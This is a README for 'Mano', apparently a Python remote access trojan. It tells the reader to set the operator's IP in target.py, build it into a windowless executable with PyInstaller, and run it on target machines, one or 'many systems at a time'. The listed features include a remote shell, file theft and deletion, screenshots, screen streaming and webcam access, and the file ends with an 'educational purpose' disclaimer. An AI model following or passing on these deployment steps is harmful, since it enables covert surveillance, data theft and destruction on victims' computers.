# Mano 
 * It is a Remote Desktop Controlling  tool based on python. Where You can control target machine using your machine.
 * Version 0.0.1
 
# System Requirements:
 * OS : Windows or Linux 
 * Python 3.9 or Greater

# Installation and configuration:
 1.	Clone the GitHub repo
 2.	Go the Mano directory and open terminal or cmd
 3.	Install the python packages using: pip install –r requirements.txt
 4.	The tool offers 2 variants of exploitation 
  a.	If you target IP address go to know_ip and edit port in host.py and in target.py by default 9999 – we can exploit one system at a time
  b.	If you target IP address go to  dont_know_ip and edit port in host.py and in target.py by default 9999 and add your IP address in target.py – we can exploit many systems at a time
 5.	Use pyinstaller --onefile -w dont_know_ip/target.py or pyinstaller --onefile -w know_ip/target.py to create executable file.
 6.	Run the host.py in your machine and the target.exe in the machine you want to test.

      
# Features
  * Access target's cmd or terminal.
  * Download files from target.
  * Upload files to target.
  * List the files in your current directory.
  * List the files in target's current directory.
  * Get your current directory.
  * Get target's current directory.
  * Change your current directory.
  * Change target's current directory.
  * Delete file in your current directory.
  * Delete file from target's current directory.
  * Screenshot of target's screen.
  * Access target camera.
  * Stream target screen.

> It is for Educational Puropse I'm not responsable if tool is misused.
